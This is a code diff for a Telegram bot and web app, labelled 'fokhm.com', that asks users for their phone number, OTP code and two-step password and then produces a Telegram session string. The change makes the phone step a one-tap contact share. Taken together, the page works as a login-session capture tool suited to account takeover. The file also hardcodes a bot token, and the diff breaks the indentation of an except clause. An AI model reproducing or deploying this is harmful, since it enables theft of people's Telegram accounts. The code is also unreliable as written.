@@ -16,7 +16,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn3
 # تخزين الجلسات المؤقتة لكل مستخدم في الذاكرة
 active_sessions = {}
 
-# واجهة Web App كاملة تطلب الرقم والكود وكلمة المرور من داخل الصفحة نفسها
+# واجهة Web App متطورة مع زر المشاركة التلقائية الفورية للرقم
 WEB_APP_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -29,7 +29,7 @@ WEB_APP_HTML = """
         body { background-color: #0f172a; color: #fff; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); width: 320px; text-align: center; }
         input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 16px; text-align: center; }
-        button { width: 95%; padding: 10px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        button { width: 95%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 10px; }
         button:hover { background: #1d4ed8; }
         .msg { color: #f87171; font-size: 14px; margin-bottom: 10px; }
         .success { color: #4ade80; font-size: 13px; word-break: break-all; background: #0f172a; padding: 10px; border-radius: 6px; text-align: left; direction: ltr; max-height: 150px; overflow-y: auto; }
@@ -39,9 +39,8 @@ WEB_APP_HTML = """
     <div class="card">
         <h2>منصة fokhm.com</h2>
         <div id="content">
-            <p>أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):</p>
-            <input type="text" id="phone_val" placeholder="+966xxxxxxxxx">
-            <button onclick="submitPhone()">إرسال الكود</button>
+            <p>انقر أدناه لمشاركة رقم هاتفك بضغطة زر واحدة:</p>
+            <button onclick="requestPhone()">📱 مشاركة رقم الهاتف تلقائياً</button>
         </div>
     </div>
 
@@ -49,6 +48,21 @@ WEB_APP_HTML = """
         let tg = window.Telegram.WebApp;
         tg.expand();
         let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user_' + Math.random();
+
+        function requestPhone() {
+            if (tg.requestContact) {
+                tg.requestContact((shared, contact) => {
+                    if (shared && contact) {
+                        callApi('phone', '+' + contact.phone_number);
+                    } else {
+                        alert("عذراً، يجب مشاركة الرقم للمتابعة.");
+                    }
+                });
+            } else {
+                let phone = prompt("أدخل رقم هاتفك مع رمز الدولة (مثال: +966...):");
+                if (phone) callApi('phone', phone);
+            }
+        }
 
         function callApi(action, value) {
             fetch('/api', {
@@ -64,7 +78,7 @@ WEB_APP_HTML = """
             .then(data => {
                 let html = '';
                 if (data.status === 'need_code') {
-                    html = `<p>أدخل رمز التحقق (OTP) الذي وصلك:</p>
+                    html = `<p>✅ تم استلام الرقم بنجاح.<br>أدخل رمز التحقق (OTP) الذي وصلك:</p>
                             <input type="text" id="code_val" placeholder="12345">
                             <button onclick="submitCode()">تأكيد الكود</button>`;
                 } else if (data.status === 'need_password') {
@@ -77,18 +91,10 @@ WEB_APP_HTML = """
                             <div class="success">${data.session}</div>`;
                 } else {
                     html = `<p class="msg">${data.message}</p>
-                            <p>أدخل رقم هاتفك مجدداً:</p>
-                            <input type="text" id="phone_val" placeholder="+966xxxxxxxxx">
-                            <button onclick="submitPhone()">إرسال الكود</button>`;
+                            <button onclick="location.reload()">إعادة المحاولة</button>`;
                 }
                 document.getElementById('content').innerHTML = html;
             });
-        }
-
-        function submitPhone() {
-            let phone = document.getElementById('phone_val').value;
-            if(!phone) { alert("أدخل الرقم أولاً"); return; }
-            callApi('phone', phone);
         }
 
         function submitCode() {
@@ -174,11 +180,10 @@ def api():
                 return {"status": "error", "message": f"كلمة المرور خطأ: {e}"}
 
     except Exception as e:
-        return {"status": "error", "message": str(e)}
+    return {"status": "error", "message": str(e)}
 
     return {"status": "error", "message": "طلب غير معروف"}
 
-# --- أمر البوت لفتح الـ Web App فقط ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
     if not web_url.startswith('http'):
@@ -188,7 +193,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لفتح تطبيق الويب وتسجيل الدخول بالكامل من داخله:",
+        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر أدناه لفتح الـ Web App ومشاركة رقمك بضغطة زر واحدة:",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -197,15 +202,13 @@ def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)
 
 if __name__ == '__main__':
-    # تشغيل سيرفر الويب في الخلفية
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
     
-    # تشغيل بوت تيليجرام
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
     
-    print("Fokhm Pure WebApp Bot is running...")
+    print("Fokhm Auto-Contact Bot is running...")
     application.run_polling()
 
